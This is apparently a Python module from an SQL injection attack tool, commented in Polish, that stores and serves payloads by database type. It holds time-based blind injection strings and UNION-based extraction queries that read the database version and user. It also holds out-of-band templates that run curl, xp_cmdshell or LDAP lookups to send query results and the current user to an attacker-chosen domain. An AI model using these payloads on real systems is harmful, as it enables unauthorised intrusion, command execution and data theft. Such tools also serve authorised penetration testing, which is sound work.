"""
PayloadManager - Zarządzanie payloadami i filtrowaniem
"""

import os


class PayloadManager:
    """Zarządzanie payloadami SQL Injection"""
    
    # Domyślne payloady dla różnych technik
    TECH_PAYLOADS = {
        "MySQL": ["' OR SLEEP(5)--", "\") OR SLEEP(5)--", "SLEEP(5)#"],
        "MSSQL": ["; WAITFOR DELAY '0:0:5'--", "') WAITFOR DELAY '0:0:5'--"],
        "PostgreSQL": ["' OR PG_SLEEP(5)--", "') OR PG_SLEEP(5)--"],
        "Oracle": ["' OR 1=dbms_pipe.receive_message('RDS', 5)--"],
        "SQLite": ["RANDOMBLOB(500000000/2)"],
        "Generic": ["' OR SLEEP(5)--", "\") OR SLEEP(5)--"]
    }
    
    BASIC_PAYLOADS = ["'", "\"", "';--"]
    
    WAF_TRIGGER_PAYLOADS = [
        "' OR 1=1--",
        "<script>alert(1)</script>",
        "UNION SELECT NULL,NULL,NULL--",
        "SLEEP(5)",
        "AND 1=1 UNION ALL SELECT 1,2,3--"
    ]
    
    # Payload do ekstrakcji danych (Fingerprinting)
    EXTRACTION_PAYLOADS = {
        "MySQL": ["UNION SELECT NULL,@@version,user(),database()#", "AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,@@version,0x7e,USER(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"],
        "PostgreSQL": ["UNION SELECT NULL,version(),current_user,current_database()--"],
        "MSSQL": ["UNION SELECT NULL,@@version,user_name(),db_name()--"],
        "Generic": ["UNION SELECT NULL,@@version,user(),database()--"]
    }

    # Payload do testów Out-of-Band (OOB)
    OOB_TEMPLATES = {
        "MySQL": ["LOAD_FILE(CONCAT('\\\\\\\\', (SELECT @@version), '.{domain}\\\\a'))"],
        "PostgreSQL": ["COPY (SELECT @@version) TO PROGRAM 'curl http://{domain}/$(whoami)'"],
        "MSSQL": ["exec master..xp_cmdshell 'ping {domain}'"],
        "Oracle": ["SELECT DBMS_LDAP.INIT((SELECT USER FROM DUAL)||'.{domain}', 80) FROM DUAL"],
        "Generic": ["' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"]
    }

    def __init__(self, payloads_dir='payloads'):
        """Inicjalizacja managera payloadów"""
        self.payloads_dir = payloads_dir
        self.loaded_payloads = {}
    
    def get_payloads_by_mode(self, mode: int, tech: str = "Generic", custom_payloads: list = None) -> list:
        """
        Pobiera payloady na podstawie trybu
        
        Args:
            mode: 1=Basic, 2=Advanced, 3=All, 4=Custom
            tech: Wykryta technologia bazy danych
            custom_payloads: Własne payloady (dla mode 4)
        
        Returns:
            Lista payloadów do użycia
        """
        if mode == 1:
            payloads = self.BASIC_PAYLOADS
        elif mode == 2:
            payloads = self.TECH_PAYLOADS.get(tech, self.TECH_PAYLOADS["Generic"])
        elif mode == 3:
            payloads = self.BASIC_PAYLOADS + self.TECH_PAYLOADS.get(tech, self.TECH_PAYLOADS["Generic"])
        elif mode == 4:
            payloads = custom_payloads or []
        else:
            payloads = []
        
        return self.filter_payloads_by_tech(payloads, tech)
    
    def filter_payloads_by_tech(self, payloads: list, tech: str) -> list:
        """
        Filtruje payloady usuwając te niezgodne z technologią
        
        Args:
            payloads: Lista payloadów do filtrowania
            tech: Technologia bazy danych
        
        Returns:
            Przefiltrowana lista payloadów
        """
        if tech == "Generic":
            return payloads
        
        exclude_map = {
            "MySQL": ["WAITFOR DELAY", "PG_SLEEP", "DBMS_PIPE", "DBMS_LOCK", "RANDOMBLOB"],
            "MSSQL": ["SLEEP(", "PG_SLEEP", "DBMS_PIPE", "DBMS_LOCK", "BENCHMARK("],
            "PostgreSQL": ["SLEEP(", "WAITFOR DELAY", "DBMS_PIPE", "DBMS_LOCK", "BENCHMARK("],
            "Oracle": ["SLEEP(", "WAITFOR DELAY", "PG_SLEEP", "BENCHMARK("],
            "SQLite": ["SLEEP(", "WAITFOR DELAY", "PG_SLEEP", "DBMS_PIPE", "DBMS_LOCK"]
        }
        
        excludes = exclude_map.get(tech, [])
        filtered = []
        for p in payloads:
            if not any(ex in p.upper() for ex in excludes):
                filtered.append(p)
        return filtered
    
    def get_extraction_payloads(self, tech: str = "Generic") -> list:
        """Zwraca payloady do automatycznej eksploatacji"""
        return self.EXTRACTION_PAYLOADS.get(tech, self.EXTRACTION_PAYLOADS["Generic"])

    def get_oob_payloads(self, domain: str, tech: str = "Generic") -> list:
        """Generuje payloady OOB dla konkretnej domeny"""
        templates = self.OOB_TEMPLATES.get(tech, self.OOB_TEMPLATES["Generic"])
        return [t.format(domain=domain) for t in templates]

    def load_payloads_from_file(self, filepath: str) -> list:
        """
        Ładuje payloady z pliku
        
        Args:
            filepath: Ścieżka do pliku z payloadami
        
        Returns:
            Lista payloadów
        """
        payloads = []
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                payloads = [line.strip() for line in f if line.strip()]
            self.loaded_payloads[filepath] = payloads
        except Exception as e:
            print(f"[ERROR] Nie można załadować payloadów z {filepath}: {e}")
        
        return payloads
    
    def get_payload_file_list(self) -> list:
        """Zwraca listę dostępnych plików payloadów"""
        if not os.path.exists(self.payloads_dir):
            try:
                os.makedirs(self.payloads_dir, exist_ok=True)
            except: pass
            return []
        
        payload_files = []
        try:
            for filename in os.listdir(self.payloads_dir):
                if filename.endswith('.txt'):
                    filepath = os.path.join(self.payloads_dir, filename)
                    if os.path.isfile(filepath):
                        payload_files.append((filename, filepath))
        except Exception as e:
            print(f"[ERROR] Błąd podczas czytania listy payloadów: {e}")
        
        return sorted(payload_files)
    
    def get_waf_trigger_payloads(self) -> list:
        """Zwraca payloady do testowania WAF"""
        return self.WAF_TRIGGER_PAYLOADS.copy()
